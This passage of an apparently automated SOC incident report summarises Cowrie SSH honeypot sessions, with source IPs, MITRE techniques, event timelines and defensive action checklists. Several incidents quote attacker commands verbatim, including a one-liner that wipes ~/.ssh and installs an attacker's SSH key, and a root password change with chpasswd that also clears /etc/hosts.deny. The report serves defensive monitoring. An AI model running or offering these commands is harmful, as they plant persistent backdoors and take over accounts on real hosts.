| `2026-05-24 15:34:00` | `cowrie.command.input` |
| `2026-05-24 15:34:01` | `cowrie.session.file_download` |
| `2026-05-24 15:34:01` | `cowrie.log.closed` |
| `2026-05-24 15:34:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.112.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `40.112.183[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37130bd6e7c0

| Field | Detail |
|---|---|
| **Source IP** | `40.112.183[.]29` |
| **First Seen** | 2026-05-24 15:34 |
| **Last Seen** | 2026-05-24 15:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 15:34:04` | `cowrie.session.connect` |
| `2026-05-24 15:34:05` | `cowrie.client.version` |
| `2026-05-24 15:34:05` | `cowrie.client.kex` |
| `2026-05-24 15:34:06` | `cowrie.login.success` |
| `2026-05-24 15:34:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.112.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `40.112.183[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a74ce4a8ab51

| Field | Detail |
|---|---|
| **Source IP** | `186.56.11[.]2` |
| **First Seen** | 2026-05-24 15:40 |
| **Last Seen** | 2026-05-24 15:40 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 15:40:39` | `cowrie.session.connect` |
| `2026-05-24 15:40:39` | `cowrie.client.version` |
| `2026-05-24 15:40:40` | `cowrie.client.kex` |
| `2026-05-24 15:40:41` | `cowrie.login.success` |
| `2026-05-24 15:40:42` | `cowrie.session.params` |
| `2026-05-24 15:40:42` | `cowrie.command.input` |
| `2026-05-24 15:40:42` | `cowrie.command.failed` |
| `2026-05-24 15:40:43` | `cowrie.log.closed` |
| `2026-05-24 15:40:44` | `cowrie.session.params` |
| `2026-05-24 15:40:44` | `cowrie.command.input` |
| `2026-05-24 15:40:44` | `cowrie.session.file_download` |
| `2026-05-24 15:40:44` | `cowrie.log.closed` |
| `2026-05-24 15:40:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.56.11[.]2` to AbuseIPDB if not already reported
- [ ] Block `186.56.11[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bec3585ef5f9

| Field | Detail |
|---|---|
| **Source IP** | `186.56.11[.]2` |
| **First Seen** | 2026-05-24 15:40 |
| **Last Seen** | 2026-05-24 15:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 15:40:49` | `cowrie.session.connect` |
| `2026-05-24 15:40:49` | `cowrie.client.version` |
| `2026-05-24 15:40:50` | `cowrie.client.kex` |
| `2026-05-24 15:40:51` | `cowrie.login.success` |
| `2026-05-24 15:40:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.56.11[.]2` to AbuseIPDB if not already reported
- [ ] Block `186.56.11[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-766a1be5e85e

| Field | Detail |
|---|---|
| **Source IP** | `186.56.11[.]2` |
| **First Seen** | 2026-05-24 15:45 |
| **Last Seen** | 2026-05-24 15:46 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 15:45:58` | `cowrie.session.connect` |
| `2026-05-24 15:45:58` | `cowrie.client.version` |
| `2026-05-24 15:45:58` | `cowrie.client.kex` |
| `2026-05-24 15:46:00` | `cowrie.login.success` |
| `2026-05-24 15:46:01` | `cowrie.session.params` |
| `2026-05-24 15:46:01` | `cowrie.command.input` |
| `2026-05-24 15:46:01` | `cowrie.command.failed` |
| `2026-05-24 15:46:02` | `cowrie.log.closed` |
| `2026-05-24 15:46:02` | `cowrie.session.params` |
| `2026-05-24 15:46:02` | `cowrie.command.input` |
| `2026-05-24 15:46:03` | `cowrie.session.file_download` |
| `2026-05-24 15:46:03` | `cowrie.log.closed` |
| `2026-05-24 15:46:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.56.11[.]2` to AbuseIPDB if not already reported
- [ ] Block `186.56.11[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dee5e8a4451

| Field | Detail |
|---|---|
| **Source IP** | `186.56.11[.]2` |
| **First Seen** | 2026-05-24 15:46 |
| **Last Seen** | 2026-05-24 15:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 15:46:07` | `cowrie.session.connect` |
| `2026-05-24 15:46:07` | `cowrie.client.version` |
| `2026-05-24 15:46:08` | `cowrie.client.kex` |
| `2026-05-24 15:46:09` | `cowrie.login.success` |
| `2026-05-24 15:46:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.56.11[.]2` to AbuseIPDB if not already reported
- [ ] Block `186.56.11[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67c58c6ebdd7

| Field | Detail |
|---|---|
| **Source IP** | `186.56.11[.]2` |
| **First Seen** | 2026-05-24 15:51 |
| **Last Seen** | 2026-05-24 15:51 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 15:51:28` | `cowrie.session.connect` |
| `2026-05-24 15:51:28` | `cowrie.client.version` |
| `2026-05-24 15:51:28` | `cowrie.client.kex` |
| `2026-05-24 15:51:30` | `cowrie.login.success` |
| `2026-05-24 15:51:31` | `cowrie.session.params` |
| `2026-05-24 15:51:31` | `cowrie.command.input` |
| `2026-05-24 15:51:31` | `cowrie.command.failed` |
| `2026-05-24 15:51:32` | `cowrie.log.closed` |
| `2026-05-24 15:51:32` | `cowrie.session.params` |
| `2026-05-24 15:51:32` | `cowrie.command.input` |
| `2026-05-24 15:51:33` | `cowrie.session.file_download` |
| `2026-05-24 15:51:33` | `cowrie.log.closed` |
| `2026-05-24 15:51:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.56.11[.]2` to AbuseIPDB if not already reported
- [ ] Block `186.56.11[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c00b3198ba50

| Field | Detail |
|---|---|
| **Source IP** | `186.56.11[.]2` |
| **First Seen** | 2026-05-24 15:51 |
| **Last Seen** | 2026-05-24 15:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 15:51:37` | `cowrie.session.connect` |
| `2026-05-24 15:51:37` | `cowrie.client.version` |
| `2026-05-24 15:51:37` | `cowrie.client.kex` |
| `2026-05-24 15:51:39` | `cowrie.login.success` |
| `2026-05-24 15:51:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.56.11[.]2` to AbuseIPDB if not already reported
- [ ] Block `186.56.11[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83cacd1980f5

| Field | Detail |
|---|---|
| **Source IP** | `120.48.78[.]222` |
| **First Seen** | 2026-05-24 15:52 |
| **Last Seen** | 2026-05-24 15:53 |
| **Session Duration** | 100s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Irp3LvGAczIH"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 15:52:06` | `cowrie.session.connect` |
| `2026-05-24 15:52:06` | `cowrie.client.version` |
| `2026-05-24 15:52:08` | `cowrie.client.kex` |
| `2026-05-24 15:52:09` | `cowrie.login.success` |
| `2026-05-24 15:52:10` | `cowrie.session.params` |
| `2026-05-24 15:52:10` | `cowrie.command.input` |
| `2026-05-24 15:52:10` | `cowrie.command.failed` |
| `2026-05-24 15:52:10` | `cowrie.log.closed` |
| `2026-05-24 15:52:10` | `cowrie.session.params` |
| `2026-05-24 15:52:10` | `cowrie.command.input` |
| `2026-05-24 15:52:11` | `cowrie.session.file_download` |
| `2026-05-24 15:52:11` | `cowrie.log.closed` |
| `2026-05-24 15:52:28` | `cowrie.session.params` |
| `2026-05-24 15:52:28` | `cowrie.command.input` |
| `2026-05-24 15:52:29` | `cowrie.log.closed` |
| `2026-05-24 15:52:29` | `cowrie.session.params` |
| `2026-05-24 15:52:29` | `cowrie.command.input` |
| `2026-05-24 15:52:31` | `cowrie.log.closed` |
| `2026-05-24 15:52:32` | `cowrie.session.params` |
| `2026-05-24 15:52:32` | `cowrie.command.input` |
| `2026-05-24 15:52:34` | `cowrie.session.file_download` |
| `2026-05-24 15:52:34` | `cowrie.log.closed` |
| `2026-05-24 15:52:46` | `cowrie.session.params` |
| `2026-05-24 15:52:46` | `cowrie.command.input` |
| `2026-05-24 15:52:48` | `cowrie.log.closed` |
| `2026-05-24 15:52:49` | `cowrie.session.params` |
| `2026-05-24 15:52:49` | `cowrie.command.input` |
| `2026-05-24 15:52:49` | `cowrie.command.input` |
| `2026-05-24 15:52:50` | `cowrie.log.closed` |
| `2026-05-24 15:52:51` | `cowrie.session.params` |
| `2026-05-24 15:52:51` | `cowrie.command.input` |
| `2026-05-24 15:52:59` | `cowrie.log.closed` |
| `2026-05-24 15:53:00` | `cowrie.session.params` |
| `2026-05-24 15:53:00` | `cowrie.command.input` |
| `2026-05-24 15:53:02` | `cowrie.log.closed` |
| `2026-05-24 15:53:03` | `cowrie.session.params` |
| `2026-05-24 15:53:03` | `cowrie.command.input` |
| `2026-05-24 15:53:05` | `cowrie.log.closed` |
| `2026-05-24 15:53:06` | `cowrie.session.params` |
| `2026-05-24 15:53:06` | `cowrie.command.input` |
| `2026-05-24 15:53:07` | `cowrie.log.closed` |
| `2026-05-24 15:53:13` | `cowrie.session.params` |
| `2026-05-24 15:53:13` | `cowrie.command.input` |
| `2026-05-24 15:53:14` | `cowrie.log.closed` |
| `2026-05-24 15:53:14` | `cowrie.session.params` |
| `2026-05-24 15:53:14` | `cowrie.command.input` |
| `2026-05-24 15:53:16` | `cowrie.log.closed` |
| `2026-05-24 15:53:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.78[.]222` to AbuseIPDB if not already reported
- [ ] Block `120.48.78[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f6f587e78f2

| Field | Detail |
|---|---|
| **Source IP** | `101.126.23[.]159` |
| **First Seen** | 2026-05-24 15:53 |
| **Last Seen** | 2026-05-24 15:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 15:53:34` | `cowrie.session.connect` |
| `2026-05-24 15:53:34` | `cowrie.client.version` |
| `2026-05-24 15:53:34` | `cowrie.client.kex` |
| `2026-05-24 15:53:36` | `cowrie.login.success` |
| `2026-05-24 15:53:36` | `cowrie.session.params` |
| `2026-05-24 15:53:36` | `cowrie.command.input` |
| `2026-05-24 15:53:36` | `cowrie.command.failed` |
| `2026-05-24 15:53:38` | `cowrie.log.closed` |
| `2026-05-24 15:53:39` | `cowrie.session.params` |
| `2026-05-24 15:53:39` | `cowrie.command.input` |
| `2026-05-24 15:53:39` | `cowrie.session.file_download` |
| `2026-05-24 15:53:39` | `cowrie.log.closed` |
| `2026-05-24 15:53:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.23[.]159` to AbuseIPDB if not already reported
- [ ] Block `101.126.23[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1df96c3546fa

| Field | Detail |
|---|---|
| **Source IP** | `101.126.23[.]159` |
| **First Seen** | 2026-05-24 15:53 |
| **Last Seen** | 2026-05-24 15:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 15:53:41` | `cowrie.session.connect` |
| `2026-05-24 15:53:41` | `cowrie.client.version` |
| `2026-05-24 15:53:41` | `cowrie.client.kex` |
| `2026-05-24 15:53:42` | `cowrie.login.success` |
| `2026-05-24 15:53:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.23[.]159` to AbuseIPDB if not already reported
- [ ] Block `101.126.23[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7876f94cf1d

| Field | Detail |
|---|---|
| **Source IP** | `40.83.182[.]122` |
| **First Seen** | 2026-05-24 15:55 |
| **Last Seen** | 2026-05-24 15:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 15:55:52` | `cowrie.session.connect` |
| `2026-05-24 15:55:52` | `cowrie.client.version` |
| `2026-05-24 15:55:52` | `cowrie.client.kex` |
| `2026-05-24 15:55:53` | `cowrie.login.success` |
| `2026-05-24 15:55:53` | `cowrie.session.params` |
| `2026-05-24 15:55:53` | `cowrie.command.input` |
| `2026-05-24 15:55:53` | `cowrie.command.failed` |
| `2026-05-24 15:55:54` | `cowrie.log.closed` |
| `2026-05-24 15:55:54` | `cowrie.session.params` |
| `2026-05-24 15:55:54` | `cowrie.command.input` |
| `2026-05-24 15:55:54` | `cowrie.session.file_download` |
| `2026-05-24 15:55:54` | `cowrie.log.closed` |
| `2026-05-24 15:55:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.83.182[.]122` to AbuseIPDB if not already reported
- [ ] Block `40.83.182[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60201aa06146

| Field | Detail |
|---|---|
| **Source IP** | `40.83.182[.]122` |
| **First Seen** | 2026-05-24 15:55 |
| **Last Seen** | 2026-05-24 15:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 15:55:57` | `cowrie.session.connect` |
| `2026-05-24 15:55:57` | `cowrie.client.version` |
| `2026-05-24 15:55:57` | `cowrie.client.kex` |
| `2026-05-24 15:55:58` | `cowrie.login.success` |
| `2026-05-24 15:55:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.83.182[.]122` to AbuseIPDB if not already reported
- [ ] Block `40.83.182[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d747d56b158

| Field | Detail |
|---|---|
| **Source IP** | `101.126.23[.]159` |
| **First Seen** | 2026-05-24 15:56 |
| **Last Seen** | 2026-05-24 15:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 15:56:35` | `cowrie.session.connect` |
| `2026-05-24 15:56:35` | `cowrie.client.version` |
| `2026-05-24 15:56:36` | `cowrie.client.kex` |
| `2026-05-24 15:56:37` | `cowrie.login.success` |
| `2026-05-24 15:56:37` | `cowrie.session.params` |
| `2026-05-24 15:56:37` | `cowrie.command.input` |
| `2026-05-24 15:56:37` | `cowrie.command.failed` |
| `2026-05-24 15:56:37` | `cowrie.log.closed` |
| `2026-05-24 15:56:38` | `cowrie.session.params` |
| `2026-05-24 15:56:38` | `cowrie.command.input` |
| `2026-05-24 15:56:38` | `cowrie.session.file_download` |
| `2026-05-24 15:56:38` | `cowrie.log.closed` |
| `2026-05-24 15:56:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.23[.]159` to AbuseIPDB if not already reported
- [ ] Block `101.126.23[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3640e878865

| Field | Detail |
|---|---|
| **Source IP** | `101.126.23[.]159` |
| **First Seen** | 2026-05-24 15:56 |
| **Last Seen** | 2026-05-24 15:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 15:56:40` | `cowrie.session.connect` |
| `2026-05-24 15:56:40` | `cowrie.client.version` |
| `2026-05-24 15:56:40` | `cowrie.client.kex` |
| `2026-05-24 15:56:41` | `cowrie.login.success` |
| `2026-05-24 15:56:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.23[.]159` to AbuseIPDB if not already reported
- [ ] Block `101.126.23[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a06dc1da275c

| Field | Detail |
|---|---|
| **Source IP** | `186.56.11[.]2` |
| **First Seen** | 2026-05-24 16:06 |
| **Last Seen** | 2026-05-24 16:06 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:06:39` | `cowrie.session.connect` |
| `2026-05-24 16:06:39` | `cowrie.client.version` |
| `2026-05-24 16:06:39` | `cowrie.client.kex` |
| `2026-05-24 16:06:41` | `cowrie.login.success` |
| `2026-05-24 16:06:42` | `cowrie.session.params` |
| `2026-05-24 16:06:42` | `cowrie.command.input` |
| `2026-05-24 16:06:42` | `cowrie.command.failed` |
| `2026-05-24 16:06:43` | `cowrie.log.closed` |
| `2026-05-24 16:06:43` | `cowrie.session.params` |
| `2026-05-24 16:06:43` | `cowrie.command.input` |
